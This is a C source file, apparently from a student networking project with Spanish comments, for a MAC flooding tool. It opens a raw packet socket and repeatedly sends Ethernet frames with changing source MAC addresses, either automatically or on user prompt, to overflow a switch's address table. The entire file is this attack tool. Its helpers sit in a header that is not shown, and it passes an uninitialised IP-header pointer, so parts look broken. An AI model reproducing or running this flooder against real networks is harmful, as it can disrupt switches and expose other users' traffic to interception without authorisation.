#include <netinet/in.h>
#include <sys/socket.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <linux/if.h>
#include <linux/sockios.h>
#include <linux/if_ether.h>
#include <net/ethernet.h>
#include <linux/if_packet.h>
#include <sys/ioctl.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <ctype.h>
#include "ethernetFrame.h"

int main(){

    int op = 0;

    int total_len		= 0;											// Tamaño total
    int if_number = 2;														// Numero interfaz
    int modoDeUso 		= 0;											// Modo de uso, 0 auto, 1 manual
    int repeticiones 	= 0;											// Numero de frames a enviar
    char if_name[10]; 													// Nombre interfaz
    unsigned char* sendbuff;											// Buffer del frame

	struct ethhdr *eth;												  	// Estructura frame
	struct iphdr *iph;												  	// Estructura de paquete
	struct ifreq *ifreq_ip = malloc(sizeof(struct ifreq));				// ??
	struct sockaddr_ll *sadr_ll = malloc(sizeof(struct sockaddr_ll)); 	// ??
	struct macDest *mdest = malloc(sizeof(struct macDest));			  	// Estructura MAC Destino
	struct macSrc *msrc = malloc(sizeof(struct macSrc));			  	// Estructura MAC Origen

	int sock_raw = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW); 			// Creamos un rawSocket

	if (sock_raw == -1)
		printf("Error abriendo el socket"); 							// Verificamos que el socket se creo correctamente

	obtenerNombreInterfaz(if_name); 									// Obtenemos el nombre de la interfaz a usar

	obtenerNumeroInterfaz(ifreq_ip, sock_raw, if_name, &if_number); 	// Obtenemos el numero de nuestra interfaz

	modoDeUso = menuDeUso(&repeticiones); 								// Obtenemos el modo de uso del programa, si manual, o automatico

	ponerMacDestino(mdest); 											// No importa la macdestino para hacer MAC Flooding ????

	inizializarMacOrigen(msrc, modoDeUso);								// Inicializamos una mac origen

    ponerMacOrigen(msrc, modoDeUso);									// Ponemos la mac origen

    sendbuff = (unsigned char*) malloc(60);								// Reservamos memoria 60 bytes => Tamaño minimo de un frame 84 bytes, max 1512 bytes
																		// 60 bytes para ethernet header, ip header, payload etc 
																		// Se suma preambulo 7 bytes + delimitador de inicio de trama 1 byte + CRC 4 bytes
																		// + Gap entre frames 12 bytes => 60 + 7 + 1 + 4 + 12 = 84 bytes
    memset(sendbuff, 0, 60);
	eth = (struct ethhdr*)(sendbuff);

    construirCabezeraEthernet(eth, msrc, mdest, &total_len, sendbuff);	// Construimos la cabezera ethernet

    construirCabezeraIp(iph, &total_len, ifreq_ip, sendbuff);			// Construimos la cabezera ip

    do{

		printf("Enviando frame MAC = %x : %x : %x : %x : %x : %x\n", eth->h_source[0], eth->h_source[1], eth->h_source[2], eth->h_source[3], eth->h_source[4], eth->h_source[5]);

        enviarFrame(sadr_ll, sock_raw, sendbuff, mdest, if_number);		// Enviamos el frame

        if(modoDeUso == 1){												// Modo manual
            do{
                printf("Desea enviar otro frame? (1 / 0)\n");
                fflush(stdin);
                scanf("%i", &op);
            }while(op < 0 || op > 1);

        }else{															// Modo automatico
            --repeticiones;
            if(repeticiones == 0){
                do{
                    printf("Ingrese mas frames a enviar, 0 para no enviar mas\n");
                    fflush(stdin);
                    scanf("%i", &repeticiones);
                }while(repeticiones < 0);
            }
        }

        if(op == 1 || repeticiones > 0){
			cambiarMacOrigenEthernet(eth, msrc, modoDeUso);
		}

    }while(op == 1 || repeticiones > 0);

    printf("MAC Flooding completado\n");

    return 0;
}